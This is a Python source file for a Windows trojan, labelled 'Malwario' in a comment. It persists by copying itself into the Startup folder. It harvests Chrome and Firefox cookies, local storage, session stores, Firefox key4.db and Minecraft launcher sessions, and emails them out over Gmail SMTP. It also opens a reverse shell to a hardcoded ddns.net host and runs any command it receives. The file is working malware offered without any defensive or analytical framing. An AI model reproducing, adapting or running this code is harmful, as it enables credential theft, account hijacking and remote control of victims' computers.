import socket
import os
import subprocess
import shutil
import time
import getpass

from getpass import getuser
from smtplib import SMTP_SSL
from os import listdir
from os.path import getsize
from os.path import basename
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

username="null"
password="null"

USER_NAME=getpass.getuser()
diruser=getuser()
#AutoStartup Malwario
src = os.path.dirname(os.path.realpath(__file__))
src_files = os.listdir(src)

def snatcher(username,password,directory,body):
    user=username
    passwd=password
    subject = 'BrowserSessionReport'
    msg = MIMEMultipart()
    msg['From'] = user
    msg['To'] = user
    msg['Subject'] = subject
    msg.attach(MIMEText(body,'plain'))
    for file in listdir(directory):
        try:
            attachment = open(directory+str(file),'rb')
            print(str(file)+" is size:"+str(getsize(directory+str(file))))
            part = MIMEBase('application','octet-stream')
            part.set_payload((attachment).read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition',"attachment; filename= "+file)
            msg.attach(part)
        except PermissionError as e:
            print(e)
    text = msg.as_string()
    try:
        serv=SMTP_SSL('smtp.gmail.com',465)
        serv.ehlo()
        serv.login(user,passwd)
        serv.sendmail(user,user,msg.as_string())
        print("Sent!")
    except:
        print("Something went wrong")

def snatcherFile(username,password,directory,body):
    user=username
    passwd=password
    subject = 'BrowserSessionHijackReport'
    msg = MIMEMultipart()
    msg['From'] = user
    msg['To'] = user
    msg['Subject'] = subject
    msg.attach(MIMEText(body,'plain'))
    try:
        attachment = open(directory,'rb')
        filename=basename(directory)
        part = MIMEBase('application','octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',"attachment; filename= "+filename)
        msg.attach(part)
    except PermissionError as e:
        print(e)
    text = msg.as_string()
    try:
        serv=SMTP_SSL('smtp.gmail.com',465)
        serv.ehlo()
        serv.login(user,passwd)
        serv.sendmail(user,user,msg.as_string())
        print("Sent!")
    except:
        print("Something went wrong")

def add_to_startup(file_path=""):
       bat_path = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % USER_NAME
       x=0
       for filename in src_files:
                if os.path.exists(os.path.join(str(src),str(filename))) and str(filename)=="client.exe":
                       try:
                               full_file_name = os.path.join(str(src),str(filename))
                               copy_path=r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % USER_NAME
                               try:
                                       shutil.copy(full_file_name,copy_path)
                               except:
                                       try:
                                               shutil.copytree(full_file_name,copy_path+"\\"+str(filename))
                                               x+=1
                                       except:      
                                               break
                       except:
                               pass
       try:
                snatcher(username,password,("C:/Users/"+str(diruser)+"/AppData/Roaming/.minecraft/"),"Minecraft launcher session")
       except:
                pass
       try:
                snatcher(username,password,"C:/Users/"+str(diruser)+"/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb/","Chrome local app storage")
                snatcherFile(username,password,"C:/Users/"+str(diruser)+"/AppData/Local/Google/Chrome/User Data/Default/Cookies","Chrome cookies")
       except:
                pass
       try:
#I choose not to
                extra=os.listdir("C:/Users/"+str(diruser)+"/AppData/Roaming/Mozilla/Firefox/Profiles/")
                snatcherFile(username,password,"C:/Users/"+str(diruser)+"/AppData/Roaming/Mozilla/Firefox/Profiles/"+str(extra[0])+"/webappsstore.sqlite","Firefox local app storage")
                snatcherFile(username,password,"C:/Users/"+str(diruser)+"/AppData/Roaming/Mozilla/Firefox/Profiles/"+str(extra[0])+"/storage.sqlite","Firefox storage")
                snatcherFile(username,password,"C:/Users/"+str(diruser)+"/AppData/Roaming/Mozilla/Firefox/Profiles/"+str(extra[0])+"/cookies.sqlite","Firefox cookies")
                snatcherFile(username,password,"C:/Users/"+str(diruser)+"/AppData/Roaming/Mozilla/Firefox/Profiles/"+str(extra[0])+"/sessionstore.jsonlz4","Firefox sess storage")    
                snatcherFile(username,password,"C:/Users/"+str(diruser)+"/AppData/Roaming/Mozilla/Firefox/Profiles/"+str(extra[0])+"/key4.db","Firefox keys storage")    
       except:
                pass
#Only works on windows boxes so far. need one for other chrome pieces of garbage.
try:
        add_to_startup()
except:
        pass
#Create socket
#add_to_startup()
s=socket.socket()
host=socket.gethostbyname("IP")
port=9365

while True:
        try:
                s.connect((host,port))
        except TimeoutError:
                continue
        while True:
                try:
                        data=s.recv(1024)
                        if data[:2].decode('utf-8')=="cd":
                                os.chdir(data[3:].decode('utf-8'))
                        if data[:3].decode('utf-8')=="kys":
                                try:
                                        deletion="C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/client.exe" % USER_NAME
                                        os.remove(deletion)
                                except Exception as e:
                                        s.send(str.encode(output_string+str(os.getcwd())+str(e)))
                                s.close()
                                quit()
                                        
                        if len(data) > 0:
                                cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                output_bytes=cmd.stdout.read() + cmd.stderr.read()
                                output_string=str(output_bytes,'utf-8')
                                s.send(str.encode(output_string+str(os.getcwd())+"> "))
                except:
                        try:
                                s.send(str.encode("Something bad happened!"))
                                time.sleep(30)
                        except:
                                try:
                                        s=socket.socket()
                                        host=socket.gethostbyname("bastardo219.ddns.net")
                                        s.connect((host,port))
                                except TimeoutError:
                                        pass

#Close connection
s.close()